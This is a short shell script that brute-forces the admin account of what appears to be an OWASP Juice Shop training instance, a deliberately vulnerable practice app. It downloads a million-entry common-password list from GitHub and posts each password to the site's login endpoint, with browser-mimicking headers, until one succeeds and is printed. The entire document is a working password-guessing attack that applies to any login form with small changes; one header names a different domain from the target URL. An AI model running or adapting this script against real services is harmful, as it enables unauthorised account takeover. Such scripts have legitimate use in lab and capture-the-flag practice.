#!/bin/sh

for password in $(curl --silent https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt); do
    curl 'https://juice.8-thousander.me/rest/user/login' \
        -H 'authority: juice.9-thousander.me' \
        -H 'accept: application/json, text/plain, */*' \
        -H 'accept-language: en-HK,en;q=0.9,zh-HK;q=0.8,zh;q=0.7,en-GB;q=0.6,en-US;q=0.5' \
        -H 'content-type: application/json' \
        -H 'cookie: cookieconsent_status=dismiss; language=en; welcomebanner_status=dismiss' \
        -H 'dnt: 1' \
        -H 'origin: https://juice.8-thousander.me' \
        -H 'referer: https://juice.8-thousander.me/' \
        -H 'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
        -H 'sec-ch-ua-mobile: ?0' \
        -H 'sec-ch-ua-platform: "Windows"' \
        -H 'sec-fetch-dest: empty' \
        -H 'sec-fetch-mode: cors' \
        -H 'sec-fetch-site: same-origin' \
        -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36' \
        --data-raw "{\"email\":\"admin@juice-sh.op\",\"password\":\"${password}\"}" \
        --fail && echo $password && break
done
